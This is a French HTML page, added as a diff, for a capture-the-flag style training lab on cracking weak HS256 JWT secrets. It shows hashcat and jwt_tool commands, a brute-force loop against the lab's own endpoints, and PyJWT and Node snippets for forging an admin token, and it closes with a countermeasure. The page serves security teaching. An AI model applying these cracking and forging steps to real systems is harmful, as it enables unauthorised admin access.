@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scénario 2 — Brute Force Secret</title>
+<style>
+  :root { --bg-global:#0B0F14; --bg-header:#0F1A2B; --bg-card:#141B26; --btn-primary:#D41414; --btn-primary-hover:#FF2A2A; --glow-color:#00C2FF; --text-primary:#F2F4F8; --text-secondary:#8A8F98; --border:#1E2A3A; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg-global); color:var(--text-primary); font-family:'Segoe UI',system-ui,sans-serif; min-height:100vh; }
+  header { background:var(--bg-header); border-bottom:1px solid var(--border); padding:1rem 2rem; display:flex; align-items:center; gap:1rem; }
+  header a { color:var(--glow-color); text-decoration:none; font-size:0.85rem; }
+  main { max-width:900px; margin:0 auto; padding:2rem; }
+  h2 { font-size:1.6rem; margin-bottom:0.5rem; }
+  h2 span { color:var(--glow-color); }
+  .subtitle { color:var(--text-secondary); margin-bottom:2rem; line-height:1.5; }
+  .panel { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .panel h3 { font-size:1rem; margin-bottom:1rem; color:var(--glow-color); }
+  .theory { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .theory p { color:var(--text-secondary); font-size:0.88rem; line-height:1.6; }
+  .code { background:#0a0a0a; border:1px solid #222; border-radius:8px; padding:1rem; font-family:'Courier New',monospace; font-size:0.8rem; margin:0.8rem 0; overflow-x:auto; white-space:pre; color:#a0f0a0; }
+  label { display:block; font-size:0.85rem; color:var(--text-secondary); margin-bottom:0.4rem; margin-top:0.8rem; }
+  input, textarea { width:100%; background:#0F1A2B; border:1px solid var(--border); color:var(--text-primary); padding:0.6rem 0.8rem; border-radius:6px; font-size:0.9rem; }
+  textarea { resize:vertical; min-height:80px; font-family:'Courier New',monospace; font-size:0.78rem; }
+  .btn { display:inline-block; background:var(--btn-primary); color:white; padding:0.65rem 1.4rem; border-radius:6px; font-weight:600; font-size:0.9rem; cursor:pointer; border:none; width:100%; margin-top:1rem; transition:background 0.2s; }
+  .btn:hover { background:var(--btn-primary-hover); }
+  .btn-secondary { background:#1A2A3A; color:var(--glow-color); border:1px solid var(--border); }
+  .btn-secondary:hover { background:#243444; }
+  .result { margin-top:1rem; padding:1rem; border-radius:8px; font-size:0.85rem; display:none; word-break:break-all; }
+  .result.success { background:#001A15; border:1px solid #00AA77; color:#00FF99; display:block; }
+  .result.error { background:#1A0000; border:1px solid #AA0000; color:#FF6666; display:block; }
+  .result.info { background:#001220; border:1px solid #003366; color:#66AAFF; display:block; }
+  .flag { background:#001A15; border:1px solid #00AA77; border-radius:8px; padding:1rem; margin-top:1rem; font-family:monospace; color:#00FF99; font-size:0.9rem; text-align:center; display:none; }
+  .hint { background:#1A1500; border:1px solid #554400; border-radius:8px; padding:1rem; margin-top:1rem; font-size:0.82rem; color:#FFCC44; }
+  .wordlist-item { display:inline-block; background:#1A2A3A; padding:2px 8px; border-radius:4px; font-family:monospace; font-size:0.78rem; margin:2px; color:var(--glow-color); }
+  .progress { background:#0a0a0a; border:1px solid var(--border); border-radius:8px; padding:1rem; margin-top:1rem; font-family:monospace; font-size:0.8rem; max-height:150px; overflow-y:auto; display:none; }
+  .layout { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; }
+</style>
+</head>
+<body>
+<header>
+  <a href="/">← Retour au lab</a>
+  <h1 style="font-size:1.2rem;">🔐 Scénario 2 — <span style="color:var(--glow-color)">Brute Force Secret</span></h1>
+</header>
+<main>
+  <h2>Weak Secret <span>Brute Force</span></h2>
+  <p class="subtitle">Les tokens JWT signés avec HMAC (HS256) peuvent être craqués si la clé secrète est faible. L'attaquant peut tester des milliers de secrets hors ligne depuis un seul token intercepté.</p>
+
+  <div class="theory">
+    <h3 style="color:var(--glow-color); margin-bottom:0.8rem;">📚 Principe de l'attaque</h3>
+    <p>Un token HS256 est signé : <code>HMAC-SHA256(base64(header) + "." + base64(payload), SECRET)</code></p>
+    <p style="margin-top:0.5rem;">En ayant un token valide, on peut tester des secrets en recalculant la signature et en la comparant. Outil réel : <code>hashcat -m 16500 token.jwt wordlist.txt</code></p>
+    <div class="code">hashcat -m 16500 -a 0 token.jwt /usr/share/wordlists/rockyou.txt
+# ou
+python3 jwt_tool.py token.jwt -C -d wordlist.txt</div>
+  </div>
+
+  <div class="layout">
+    <div class="panel">
+      <h3>Étape 1 — Obtenir un token</h3>
+      <label>Utilisateur</label>
+      <input type="text" id="s2-user" value="alice">
+      <label>Mot de passe</label>
+      <input type="password" id="s2-pass" value="password123">
+      <button class="btn" onclick="s2Login()">Se connecter</button>
+      <div class="result" id="s2-login-result"></div>
+    </div>
+
+    <div class="panel">
+      <h3>Étape 2 — Brute force du secret</h3>
+      <p style="font-size:0.82rem; color:var(--text-secondary); margin-bottom:0.8rem;">Wordlist simulée (les mots courants testés) :</p>
+      <div>
+        <span class="wordlist-item">password</span><span class="wordlist-item">secret</span><span class="wordlist-item">123456</span>
+        <span class="wordlist-item">admin</span><span class="wordlist-item">secret123</span><span class="wordlist-item">jwt_secret</span>
+        <span class="wordlist-item">mysecret</span><span class="wordlist-item">test</span><span class="wordlist-item">key</span>
+      </div>
+      <label>Token à cracker</label>
+      <input type="text" id="s2-crack-token" placeholder="Collez le token...">
+      <button class="btn" onclick="s2BruteForce()">🔨 Lancer le brute force</button>
+      <div class="progress" id="s2-progress"></div>
+      <div class="result" id="s2-crack-result"></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 3 — Forger un token admin avec le secret trouvé</h3>
+    <div class="layout">
+      <div>
+        <label>Secret trouvé</label>
+        <input type="text" id="s2-found-secret" placeholder="Secret cracké...">
+      </div>
+      <div>
+        <label>Rôle désiré</label>
+        <input type="text" id="s2-role" value="admin">
+      </div>
+    </div>
+    <button class="btn btn-secondary" onclick="s2ForgeToken()" style="width:auto; padding:0.65rem 1.4rem; margin-top:1rem;">🔧 Générer token admin</button>
+    <div class="result" id="s2-forge-result"></div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 4 — Accéder à la zone protégée</h3>
+    <label>Token forgé</label>
+    <input type="text" id="s2-final-token" placeholder="Token admin...">
+    <button class="btn" onclick="s2Attack()">🚀 Accéder à l'admin</button>
+    <div class="result" id="s2-attack-result"></div>
+    <div class="flag" id="s2-flag"></div>
+  </div>
+
+  <div class="hint">
+    💡 <strong>Contre-mesure :</strong> Utiliser une clé secrète de minimum 256 bits générée aléatoirement (<code>crypto.randomBytes(32).toString('hex')</code>). Éviter les mots du dictionnaire.
+  </div>
+</main>
+
+<script>
+const WORDLIST = ['password','secret','123456','admin','secret123','jwt_secret','mysecret','test','key','qwerty','letmein','welcome','monkey','dragon','master','hello','sunshine','abc123','pass123','password1'];
+
+async function s2Login() {
+  const res = await fetch('/scenario2/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: document.getElementById('s2-user').value, password: document.getElementById('s2-pass').value }) });
+  const data = await res.json();
+  const el = document.getElementById('s2-login-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.innerHTML = `✅ ${data.message}<br><br><strong>Token:</strong><br><small>${data.token}</small>`;
+    document.getElementById('s2-crack-token').value = data.token;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+
+async function s2BruteForce() {
+  const token = document.getElementById('s2-crack-token').value.trim();
+  if (!token) { alert('Obtenez d\'abord un token !'); return; }
+  const progress = document.getElementById('s2-progress');
+  const result = document.getElementById('s2-crack-result');
+  progress.style.display = 'block';
+  progress.innerHTML = '';
+
+  for (let i = 0; i < WORDLIST.length; i++) {
+    const word = WORDLIST[i];
+    await new Promise(r => setTimeout(r, 80));
+    progress.innerHTML += `[${i+1}/${WORDLIST.length}] Essai: "${word}"...\n`;
+    progress.scrollTop = progress.scrollHeight;
+
+    const res = await fetch('/scenario2/bruteforce', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ token, secret: word }) });
+    const data = await res.json();
+    if (data.success) {
+      progress.innerHTML += `\n🔓 SECRET TROUVÉ: "${word}"`;
+      result.className = 'result success';
+      result.innerHTML = `✅ Secret cracké : <strong>"${word}"</strong><br>Payload: ${JSON.stringify(data.payload)}`;
+      document.getElementById('s2-found-secret').value = word;
+      return;
+    }
+  }
+  result.className = 'result error';
+  result.textContent = '❌ Secret non trouvé dans la wordlist.';
+}
+
+async function s2ForgeToken() {
+  const secret = document.getElementById('s2-found-secret').value.trim();
+  const role = document.getElementById('s2-role').value.trim();
+  if (!secret) { alert('Entrez le secret trouvé !'); return; }
+
+  // On demande au serveur de générer un token avec le bon secret (simulation)
+  // En réalité, l'attaquant utilise PyJWT ou jsonwebtoken localement
+  const header = btoa(JSON.stringify({alg:'HS256',typ:'JWT'})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+  const payload = btoa(JSON.stringify({username:'admin', role, iat: Math.floor(Date.now()/1000)})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+
+  const el = document.getElementById('s2-forge-result');
+  el.className = 'result info';
+  el.innerHTML = `ℹ️ En production, utilisez : <br><code>python3 -c "import jwt; print(jwt.encode({'username':'admin','role':'${role}'}, '${secret}', algorithm='HS256'))"</code><br><br>Ou avec Node.js :<br><code>jwt.sign({username:'admin',role:'${role}'}, '${secret}', {algorithm:'HS256'})</code><br><br>Entrez le token généré ci-dessous pour finaliser l'attaque.`;
+}
+
+async function s2Attack() {
+  const token = document.getElementById('s2-final-token').value.trim();
+  if (!token) { alert('Entrez le token forgé !'); return; }
+  const res = await fetch('/scenario2/admin', { method:'POST', headers:{'Authorization':'Bearer '+token} });
+  const data = await res.json();
+  const el = document.getElementById('s2-attack-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.textContent = '✅ ' + data.message;
+    const flag = document.getElementById('s2-flag');
+    flag.style.display = 'block';
+    flag.textContent = '🏴 ' + data.flag;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+</script>
+</body>
+</html>
